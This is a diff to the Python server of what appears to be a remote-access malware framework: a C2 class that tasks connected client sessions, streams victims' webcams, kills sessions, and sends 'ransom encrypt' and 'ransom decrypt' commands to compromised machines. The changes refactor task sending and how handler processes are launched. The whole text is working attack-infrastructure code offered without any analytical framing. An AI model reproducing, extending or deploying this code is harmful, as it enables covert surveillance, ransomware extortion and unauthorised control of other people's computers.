@@ -36,10 +36,6 @@ import collections
 
 # packages
 try:
-    import cv2
-except ImportError:
-    pass
-try:
     import colorama
     colorama.init(autoreset=False)
 except:
@@ -49,31 +45,18 @@ except:
 from core import *
 
 # globals
-packages = ['cv2','colorama']
+packages = ['cv2','colorama','SocketServer']
 platforms = ['win32','linux2','darwin']
-missing = []
 
 # setup
 util.is_compatible(platforms, __name__)
-for __package in packages:
-    try:
-        exec("import {}".format(__package), globals())
-    except ImportError:
-        util.__logger__.debug("missing required package '{}'".format(__package))
-        missing.append(__package if __package != 'cv2' else 'opencv-python')
-
-# fix missing dependencies
-if missing:
-    util.__logger__.info("installing missing packages: {}".format(', '.join(missing)))
-    proc = subprocess.Popen('sudo {} -m pip install {}'.format(sys.executable, ' '.join(missing)), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-    proc.wait()
-    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
+util.imports(packages, __builtins__)
 
 # globals
 __threads = {}
 __abort = False
 __debug = bool('--debug' in sys.argv)
-__logger = logging.getLogger('SERVER')
+__logger = logging.getLogger(__name__)
 logging.basicConfig(level=logging.DEBUG if globals()['__debug'] else logging.INFO, handler=logging.StreamHandler())
 
 def main():
@@ -104,7 +87,8 @@ def main():
         help='SQLite database')
 
     options = parser.parse_args()
-    globals()['resource_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=os.path.abspath('modules'), shell=True)
+
+    globals()['handler'] = subprocess.Popen([sys.executable, 'core/handlers.py', '--host', options.host, '--port', str(options.port)], 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.db)
     c2.run()
 
@@ -284,9 +268,11 @@ class C2():
         
         """
         if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
+            globals()['package_handler'].terminate()
+            globals()['module_handler'].terminate()
             for session in self._get_sessions():
                 session._active.set()
-                self.send('mode passive', session=session.id)
+                session.send_task('mode passive')
         globals()['__abort'] = True
         self._active.clear()
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
@@ -444,7 +430,7 @@ class C2():
 
         """
         for session in self._get_sessions():
-            self.send(command, session=session.id)
+            session.send_task(command, session=session.id)
 
     def session_webcam(self, args=''):
         """ 
@@ -470,7 +456,7 @@ class C2():
                     s.bind(('0.0.0.0', port))
                     s.listen(1)
                     cmd = 'webcam stream {}'.format(port)
-                    self.send(cmd, session.id)
+                    client.send_task(cmd)
                     conn, addr = s.accept()
                     break
                 except:
@@ -500,8 +486,8 @@ class C2():
                 cv2.destroyAllWindows()
                 result = 'Webcam stream ended'
         else:
-            self.send("webcam %s" % args, session.id)
-            task = self.recv(id=session.id)
+            client.send_task("webcam %s" % args)
+            task = client.recv_task()
             result = task.get('result')
         util.display(result)
 
@@ -516,17 +502,18 @@ class C2():
         if not str(session).isdigit() or int(session) not in self.sessions:
             return
         else:
+            # select session
             session = self.sessions[int(session)]
             session._active.clear()
-            self.send('kill', session=session)
-            try:
-                session.connection.close()
-            except: pass
-            try:
-                session.connection.shutdown()
-            except: pass
+            # send kill command to client
+            session.send_task({"task": "kill", "session": session.info.get('uid')})
+            # shutdown the connection
+            session.connection.shutdown(socket.SHUT_RDWR)
+            session.connection.close()
+            # update current sessions
             _ = self.sessions.pop(int(session), None)
-            del _
+            # update persistent database
+            self.database.update_status(self.info.get('uid'), 0)
             util.display(self._text_color + self._text_style)
             if not self.current_session:
                 with self._lock:
@@ -572,9 +559,9 @@ class C2():
         """
         if self.current_session:
             if 'decrypt' in str(args):
-                self.send("ransom decrypt %s" % key.exportKey(), session=self.current_session.session)
+                self.current_session.send_task("ransom decrypt %s" % key.exportKey())
             elif 'encrypt' in str(args):
-                self.send("ransom %s" % args, session=self.current_session.session)
+                self.current_session.send_task("ransom %s" % args)
             else:
                 self._error("Error: invalid option '%s'" % args)
         else:
@@ -805,7 +792,7 @@ class Session(threading.Thread):
                         self._active.set()
                     elif 'prompt' in task.get('task'):
                         self._prompt = task
-                        command = self._get_prompt(task.get('result') % int(self.id))
+                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
                         cmd, _, action  = command.partition(' ')
                         if cmd in ('\n', ' ', ''):
                             continue
